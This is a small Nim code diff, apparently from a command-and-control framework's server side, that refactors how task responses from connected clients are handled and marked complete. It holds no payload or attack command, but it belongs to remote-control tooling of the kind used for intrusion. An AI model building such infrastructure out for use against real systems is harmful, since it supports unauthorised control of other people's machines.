@@ -9,7 +9,7 @@ import std/[
 
 import pixie
 
-import types, logging, communication, handleResponse, events
+import types, logging, communication, handleResponse, events, tasks
 
 proc generateClientHash(c: C2Client): string =
   getMD5(
@@ -72,9 +72,9 @@ proc processMessage*(client: ref C2Client, response: JsonNode) {.async.} =
         client.loaded = true
         onClientConnected(client[])
         cConnected client[]
+      handleResponse(task, response)
     of "output":
       infoLog $client[] & " completed task " & task.action
-      handleResponse(client[], false, response)
-  
-  task.mark_as_completed(response)
-  onClientTaskCompleted(client[], task)
+      handleResponse(task, response)
+
+    task.markAsCompleted()
